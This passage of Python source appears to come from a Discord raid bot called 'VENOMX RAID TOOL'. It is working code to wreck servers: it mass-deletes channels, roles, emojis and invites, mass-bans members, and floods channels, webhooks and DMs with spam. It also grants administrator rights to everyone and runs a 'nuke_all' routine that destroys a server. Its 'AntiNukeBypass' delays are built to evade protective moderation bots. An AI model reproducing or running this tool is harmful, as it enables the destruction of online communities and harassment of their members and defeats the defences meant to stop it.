    created = 0
    async with channel_semaphore:
        for i in range(num):
            if await AntiNukeBypass.smart_rate_limit_aware_delay():
                continue
            try:
                suffix = random.randint(1000, 9999)
                await rate_limited_request(guild.create_text_channel(f"{name}-{suffix}"))
                created += 1
                if created % 10 == 0:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] CREATED ({created}/{num})"))
                await asyncio.sleep(AntiNukeBypass.human_delay())
            except:
                pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] CREATED {created}/{num} CHANNELS"))


async def create_roles(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    try:
        num = int(await asyncio.to_thread(input, "NUMBER OF ROLES: "))
        name = await asyncio.to_thread(input, "ROLE NAME: ")
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID INPUT"))
        return
    
    created = 0
    async with role_semaphore:
        for i in range(num):
            if await AntiNukeBypass.smart_rate_limit_aware_delay():
                continue
            try:
                suffix = random.randint(1000, 9999)
                await rate_limited_request(guild.create_role(name=f"{name}-{suffix}"))
                created += 1
                if created % 10 == 0:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] CREATED ({created}/{num})"))
                await asyncio.sleep(AntiNukeBypass.burst_delay())
            except:
                pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] CREATED {created}/{num} ROLES"))


async def delete_channels(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    channels = list(guild.channels)
    if not channels:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] NO CHANNELS TO DELETE"))
        return
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"🗑️ DELETING {len(channels)} CHANNELS..."))
    
    deleted = 0
    async with channel_semaphore:
        for channel in channels:
            if await AntiNukeBypass.smart_rate_limit_aware_delay():
                continue
            try:
                await rate_limited_request(channel.delete())
                deleted += 1
                if deleted % 5 == 0:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] DELETED ({deleted}/{len(channels)})"))
                await asyncio.sleep(AntiNukeBypass.human_delay())
            except:
                pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] DELETED {deleted}/{len(channels)} CHANNELS"))


async def delete_roles(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    roles = [r for r in guild.roles if r != guild.default_role and r != guild.me.top_role]
    if not roles:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] NO ROLES TO DELETE"))
        return
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"🗑️ DELETING {len(roles)} ROLES..."))
    
    deleted = 0
    async with role_semaphore:
        for role in roles:
            if await AntiNukeBypass.smart_rate_limit_aware_delay():
                continue
            try:
                await rate_limited_request(role.delete())
                deleted += 1
                if deleted % 10 == 0:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] DELETED ({deleted}/{len(roles)})"))
                await asyncio.sleep(AntiNukeBypass.human_delay())
            except:
                pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] DELETED {deleted}/{len(roles)} ROLES"))


async def delete_emojis(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    if not guild.emojis:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] NO EMOJIS TO DELETE"))
        return
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"🗑️ DELETING {len(guild.emojis)} EMOJIS..."))
    
    deleted = 0
    for emoji in guild.emojis:
        if await AntiNukeBypass.smart_rate_limit_aware_delay():
            continue
        try:
            await rate_limited_request(emoji.delete())
            deleted += 1
            await asyncio.sleep(AntiNukeBypass.human_delay())
        except:
            pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] DELETED {deleted}/{len(guild.emojis)} EMOJIS"))


async def spam_channels(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    message = await asyncio.to_thread(input, "SPAM MESSAGE: ")
    try:
        count = int(await asyncio.to_thread(input, "MESSAGES PER CHANNEL (MAX 20): "))
        count = min(max(count, 1), 20)
    except ValueError:
        count = 5
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"💬 SPAMMING {len(guild.text_channels)} CHANNELS x {count} MESSAGES..."))
    
    sent = 0
    async with message_semaphore:
        for channel in guild.text_channels:
            for _ in range(count):
                if await AntiNukeBypass.smart_rate_limit_aware_delay():
                    continue
                try:
                    await rate_limited_request(channel.send(message))
                    sent += 1
                    await asyncio.sleep(AntiNukeBypass.burst_delay())
                except:
                    pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] SPAM COMPLETE — {sent} MESSAGES SENT"))


async def check_updates():
    print(Colorate.Horizontal(Colors.red_to_blue, "[+] CHECKING UPDATES..."))
    await asyncio.sleep(1)
    print(Colorate.Horizontal(Colors.red_to_blue, "[+] YOU ARE ON THE LATEST VERSION — VENOMX ULTIMATE v2.0"))


async def show_credits():
    credits = """
╔══════════════════════════════════════════════════════════╗
║                      CREDITS                             ║
╠══════════════════════════════════════════════════════════╣
║  MADE BY: VENOMX                                         ║
║  VERSION: ULTIMATE EDITION v2.0                          ║
║  DISCORD: https://discord.gg/UJd7XSp87                   ║
║  TOOL: VENOMX RAID TOOL - TOTAL DESTRUCTION              ║
║  FEATURES: 45+ RAID OPTIONS | ANTI-BAN | FAST            ║
║  ANTI-NUKE BYPASS: ACTIVE                                ║
╚══════════════════════════════════════════════════════════╝
    """
    print(Colorate.Vertical(Colors.red_to_blue, credits))
    await asyncio.sleep(3)


async def nick_all(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    nick = await asyncio.to_thread(input, "NEW NICKNAME: ")
    
    targets = [m for m in guild.members if m.id not in whitelisted_users and not m.bot]
    print(Colorate.Horizontal(Colors.red_to_blue, f"✏️ CHANGING NICKNAMES FOR {len(targets)} MEMBERS..."))
    
    changed = 0
    for member in targets:
        if await AntiNukeBypass.smart_rate_limit_aware_delay():
            continue
        try:
            await rate_limited_request(member.edit(nick=nick))
            changed += 1
            if changed % 20 == 0:
                print(Colorate.Horizontal(Colors.red_to_blue, f"[+] NICKED ({changed}/{len(targets)})"))
            await asyncio.sleep(AntiNukeBypass.human_delay())
        except:
            pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] NICKNAME CHANGED FOR {changed}/{len(targets)} MEMBERS"))


async def change_guild_icon(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    url = await asyncio.to_thread(input, "ICON URL: ")
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    icon_data = await resp.read()
                    if len(icon_data) > 256000:
                        print(Colorate.Horizontal(Colors.red_to_blue, "[-] ICON TOO LARGE (max 256KB)"))
                        return
                    await rate_limited_request(guild.edit(icon=icon_data))
                    print(Colorate.Horizontal(Colors.red_to_blue, "[+] GUILD ICON CHANGED"))
                else:
                    print(Colorate.Horizontal(Colors.red_to_blue, "[-] FAILED TO FETCH ICON"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))


async def change_guild_info(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    name = await asyncio.to_thread(input, "NEW SERVER NAME: ")
    desc = await asyncio.to_thread(input, "NEW DESCRIPTION: ")
    
    try:
        await rate_limited_request(guild.edit(name=name, description=desc))
        print(Colorate.Horizontal(Colors.red_to_blue, "[+] GUILD INFO UPDATED"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] FAILED: {e}"))


async def give_admin(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    # Create admin role
    try:
        role = await rate_limited_request(
            guild.create_role(name="VENOMX-ADMIN", permissions=discord.Permissions.all())
        )
        # Try to position it high
        try:
            await role.edit(position=guild.me.top_role.position - 1)
        except:
            pass
    except:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] FAILED TO CREATE ADMIN ROLE"))
        return
    
    user_id = await asyncio.to_thread(input, "USER ID (ENTER FOR ALL MEMBERS): ")
    
    if not user_id:
        targets = [m for m in guild.members if m.id not in whitelisted_users and not m.bot]
        granted = 0
        for member in targets:
            try:
                await rate_limited_request(member.add_roles(role))
                granted += 1
                if granted % 20 == 0:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] ADMIN GIVEN ({granted}/{len(targets)})"))
                await asyncio.sleep(AntiNukeBypass.human_delay())
            except:
                pass
        print(Colorate.Horizontal(Colors.red_to_blue, f"[+] ADMIN GIVEN TO {granted}/{len(targets)} MEMBERS"))
    else:
        try:
            member = await guild.fetch_member(int(user_id))
            await rate_limited_request(member.add_roles(role))
            print(Colorate.Horizontal(Colors.red_to_blue, f"[+] ADMIN GIVEN TO {member.name}"))
        except:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] FAILED TO GIVE ADMIN"))


async def delete_invites(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    invites = await guild.invites()
    if not invites:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] NO INVITES TO DELETE"))
        return
    
    for invite in invites:
        try:
            await rate_limited_request(invite.delete())
            await asyncio.sleep(0.1)
        except:
            pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] DELETED {len(invites)} INVITES"))


async def switch_guild():
    global server_id
    new_id = await asyncio.to_thread(input, "NEW GUILD ID: ")
    server_id = new_id
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] SWITCHED TO GUILD: {server_id}"))


async def timeout_all(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    try:
        duration = int(await asyncio.to_thread(input, "TIMEOUT DURATION (SECONDS): "))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID INPUT"))
        return
    
    targets = [m for m in guild.members if m.id not in whitelisted_users 
               and not m.bot and not m.guild_permissions.administrator]
    print(Colorate.Horizontal(Colors.red_to_blue, f"⏰ TIMEOUTING {len(targets)} MEMBERS FOR {duration}s..."))
    
    timed_out = 0
    for member in targets:
        try:
            await rate_limited_request(
                member.timeout(discord.utils.utcnow() + datetime.timedelta(seconds=duration))
            )
            timed_out += 1
            if timed_out % 20 == 0:
                print(Colorate.Horizontal(Colors.red_to_blue, f"[+] TIMEOUTED ({timed_out}/{len(targets)})"))
            await asyncio.sleep(AntiNukeBypass.human_delay())
        except:
            pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] TIMEOUT APPLIED TO {timed_out}/{len(targets)} MEMBERS"))


async def rename_all_channels(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    new_name = await asyncio.to_thread(input, "NEW CHANNEL NAME: ")
    
    renamed = 0
    for channel in guild.channels:
        try:
            suffix = random.randint(1000, 9999)
            await rate_limited_request(channel.edit(name=f"{new_name}-{suffix}"))
            renamed += 1
            await asyncio.sleep(AntiNukeBypass.human_delay())
        except:
            pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] RENAMED {renamed} CHANNELS"))


async def rename_all_roles(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    new_name = await asyncio.to_thread(input, "NEW ROLE NAME: ")
    
    roles = [r for r in guild.roles if r != guild.default_role]
    renamed = 0
    for role in roles:
        try:
            suffix = random.randint(1000, 9999)
            await rate_limited_request(role.edit(name=f"{new_name}-{suffix}"))
            renamed += 1
            await asyncio.sleep(AntiNukeBypass.human_delay())
        except:
            pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] RENAMED {renamed} ROLES"))


async def webhook_spam(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    message = await asyncio.to_thread(input, "SPAM MESSAGE: ")
    try:
        count = int(await asyncio.to_thread(input, "MESSAGES PER WEBHOOK (MAX 20): "))
        count = min(max(count, 1), 20)
    except ValueError:
        count = 5
    
    webhooks_created = 0
    async with webhook_semaphore:
        for channel in guild.text_channels[:10]:
            try:
                webhook = await rate_limited_request(
                    channel.create_webhook(name="VENOMX-SPAM")
                )
                webhooks_created += 1
                for _ in range(count):
                    if await AntiNukeBypass.smart_rate_limit_aware_delay():
                        continue
                    await rate_limited_request(webhook.send(message))
                    await asyncio.sleep(AntiNukeBypass.burst_delay())
            except:
                pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] WEBHOOK SPAM COMPLETE — {webhooks_created} WEBHOOKS USED"))


async def untimeout_all(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    timed_out_members = [m for m in guild.members if m.timed_out_until]
    for member in timed_out_members:
        try:
            await rate_limited_request(member.timeout(None))
            await asyncio.sleep(0.1)
        except:
            pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] TIMEOUTS REMOVED FROM {len(timed_out_members)} MEMBERS"))


async def dm_all(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    message = await asyncio.to_thread(input, "DM MESSAGE: ")
    
    targets = [m for m in guild.members if not m.bot and m.id not in whitelisted_users]
    print(Colorate.Horizontal(Colors.red_to_blue, f"📨 DMING {len(targets)} MEMBERS..."))
    
    sent = 0
    async with dm_semaphore:
        for member in targets:
            try:
                await rate_limited_request(member.send(message))
                sent += 1
                if sent % 20 == 0:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] DMS SENT ({sent}/{len(targets)})"))
                await asyncio.sleep(AntiNukeBypass.human_delay())
            except:
                pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] DMS SENT TO {sent}/{len(targets)} MEMBERS"))


async def unban_all(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    try:
        bans = [entry async for entry in guild.bans()]
    except:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] FAILED TO FETCH BAN LIST"))
        return
    
    if not bans:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] NO BANNED USERS"))
        return
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"🔓 UNBANNING {len(bans)} USERS..."))
    
    unbanned = 0
    for ban_entry in bans:
        try:
            await rate_limited_request(guild.unban(ban_entry.user))
            unbanned += 1
            if unbanned % 10 == 0:
                print(Colorate.Horizontal(Colors.red_to_blue, f"[+] UNBANNED ({unbanned}/{len(bans)})"))
            await asyncio.sleep(0.1)
        except:
            pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] UNBANNED {unbanned}/{len(bans)} USERS"))


async def strip_all_perms(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    roles = [r for r in guild.roles if r != guild.default_role]
    print(Colorate.Horizontal(Colors.red_to_blue, f"🔓 STRIPPING PERMS FROM {len(roles)} ROLES..."))
    
    stripped = 0
    for role in roles:
        try:
            await rate_limited_request(role.edit(permissions=discord.Permissions.none()))
            stripped += 1
            await asyncio.sleep(AntiNukeBypass.human_delay())
        except:
            pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] PERMISSIONS STRIPPED FROM {stripped}/{len(roles)} ROLES"))


async def auto_admin(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    try:
        role = await rate_limited_request(
            guild.create_role(name="AUTO-ADMIN-VENOMX", permissions=discord.Permissions.all())
        )
        try:
            await role.edit(position=guild.me.top_role.position - 1)
        except:
            pass
    except:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] FAILED TO CREATE ROLE"))
        return
    
    targets = [m for m in guild.members if m.id not in whitelisted_users and not m.bot]
    granted = 0
    for member in targets:
        try:
            await rate_limited_request(member.add_roles(role))
            granted += 1
            if granted % 20 == 0:
                print(Colorate.Horizontal(Colors.red_to_blue, f"[+] ADMIN GIVEN ({granted}/{len(targets)})"))
            await asyncio.sleep(AntiNukeBypass.human_delay())
        except:
            pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] AUTO-ADMIN APPLIED TO {granted}/{len(targets)} MEMBERS"))


async def lock_channels(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    locked = 0
    for channel in guild.text_channels:
        try:
            await rate_limited_request(
                channel.set_permissions(guild.default_role, send_messages=False)
            )
            locked += 1
            await asyncio.sleep(0.1)
        except:
            pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] LOCKED {locked} CHANNELS"))


async def unlock_channels(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    unlocked = 0
    for channel in guild.text_channels:
        try:
            await rate_limited_request(
                channel.set_permissions(guild.default_role, send_messages=True)
            )
            unlocked += 1
            await asyncio.sleep(0.1)
        except:
            pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] UNLOCKED {unlocked} CHANNELS"))


async def rename_emoji(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    new_name = await asyncio.to_thread(input, "NEW EMOJI NAME: ")
    
    for emoji in guild.emojis:
        try:
            await rate_limited_request(emoji.edit(name=new_name))
            await asyncio.sleep(0.1)
        except:
            pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] ALL EMOJIS RENAMED TO '{new_name}'"))


async def unlock_all_users(server_id):
    await untimeout_all(server_id)


async def nuke_all(server_id):
    """Complete server nuke with anti-nuke bypass."""
    guild = bot.get_guild(int(server_id))
    if not guild:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] GUILD NOT FOUND"))
        return
    
    print(Colorate.Horizontal(Colors.red, "💣" * 30))
    print(Colorate.Horizontal(Colors.red, "💣 INITIATING COMPLETE NUKE — VENOMX STYLE 💣"))
    print(Colorate.Horizontal(Colors.red, "💣" * 30))
    
    # Phase 0: Detect and whitelist anti-nuke bots
    detected = await detect_antinuke_bots(guild)
    for b in detected:
        whitelisted_users.add(b['id'])
    save_whitelist()
    
    # Delete all channels
    print(Colorate.Horizontal(Colors.cyan, "[*] DELETING CHANNELS..."))
    for channel in guild.channels:
        try:
            await rate_limited_request(channel.delete())
            await asyncio.sleep(AntiNukeBypass.human_delay())
        except:
            pass
    
    # Delete all roles
    print(Colorate.Horizontal(Colors.cyan, "[*] DELETING ROLES..."))
    roles = [r for r in guild.roles if r != guild.default_role and r != guild.me.top_role]
    for role in roles:
        try:
            await rate_limited_request(role.delete())
            await asyncio.sleep(AntiNukeBypass.human_delay())
        except:
            pass
    
    # Ban all members
    print(Colorate.Horizontal(Colors.cyan, "[*] BANNING MEMBERS..."))
    members = [m for m in guild.members if m.id not in whitelisted_users and m != bot.user]
    for member in members[:200]:
        try:
            await rate_limited_request(member.ban(reason="VENOMX NUKE", delete_message_days=0))
            await asyncio.sleep(AntiNukeBypass.human_delay())
        except:
            pass
    
    # Create spam channels
    print(Colorate.Horizontal(Colors.cyan, "[*] CREATING SPAM CHANNELS..."))
    for i in range(50):
        try:
            await rate_limited_request(guild.create_text_channel(f"VENOMX-NUKED-{random.randint(1000,9999)}"))
            await asyncio.sleep(AntiNukeBypass.burst_delay())
        except:
            pass
    
    # Change guild info
    try:
        await guild.edit(name="NUKED-BY-VENOMX", description="Server destroyed by VENOMX")
    except:
        pass
    
    print(Colorate.Horizontal(Colors.green, "💣 COMPLETE NUKE FINISHED — SERVER DESTROYED 💣"))


async def get_invite_link(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    
    try:
        channel = guild.text_channels[0] if guild.text_channels else None
        if not channel:
            channel = await guild.create_text_channel("temp-invite")
        invite = await channel.create_invite(max_age=0, max_uses=0)
        print(Colorate.Horizontal(Colors.red_to_blue, f"[+] INVITE LINK: {invite.url}"))
        try:
            import pyperclip
            pyperclip.copy(invite.url)
            print(Colorate.Horizontal(Colors.red_to_blue, "[+] COPIED TO CLIPBOARD"))
        except:
            pass
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] FAILED: {e}"))


def toggle_mode():
    global mode
    mode = "Deadlizer" if mode == "Wizzler" else "Wizzler"
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] MODE SWITCHED TO: {mode}"))


async def whitelist_add():
    user_id = int(await asyncio.to_thread(input, "USER ID TO WHITELIST: "))
    whitelisted_users.add(user_id)
    save_whitelist()
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] ADDED {user_id} TO WHITELIST"))


async def whitelist_remove():
    user_id = int(await asyncio.to_thread(input, "USER ID TO REMOVE: "))
    whitelisted_users.discard(user_id)
    save_whitelist()
    print(Colorate.Horizontal(Colors.red_to_blue, f"[-] REMOVED {user_id} FROM WHITELIST"))


async def view_whitelist():
    print(Colorate.Horizontal(Colors.red_to_blue, f"WHITELISTED USERS: {list(whitelisted_users)}"))
    await asyncio.sleep(2)


async def switch_config():
    global current_config
    print(Colorate.Horizontal(Colors.red_to_blue, f"AVAILABLE CONFIGS: {loaded_configs}"))
    new_config = await asyncio.to_thread(input, "SELECT CONFIG: ")
    if new_config in loaded_configs:
        current_config = new_config
        print(Colorate.Horizontal(Colors.red_to_blue, f"[+] SWITCHED TO CONFIG: {current_config}"))
    else:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] CONFIG NOT FOUND"))


async def list_configs():
    print(Colorate.Horizontal(Colors.red_to_blue, f"LOADED CONFIGS: {loaded_configs}"))
    await asyncio.sleep(2)


async def exit_bot():
    print(Colorate.Horizontal(Colors.red_to_blue, "👋 EXITING VENOMX RAID TOOL..."))
    await bot.close()
    os._exit(0)


@bot.event
async def on_ready():
    show_banner()
    print(Colorate.Horizontal(Colors.red_to_blue, f"✅ LOGGED IN AS: {bot.user.name}"))
    print(Colorate.Horizontal(Colors.red_to_blue, f"✅ BOT ID: {bot.user.id}"))
    print(Colorate.Horizontal(Colors.red_to_blue, f"✅ PING: {round(bot.latency * 1000)}ms"))
    await show_menu()


# Run bot
try:
    bot.run(bot_token)
except Exception as e:
    print(Colorate.Horizontal(Colors.red_to_blue, f"ERROR: {e}"))
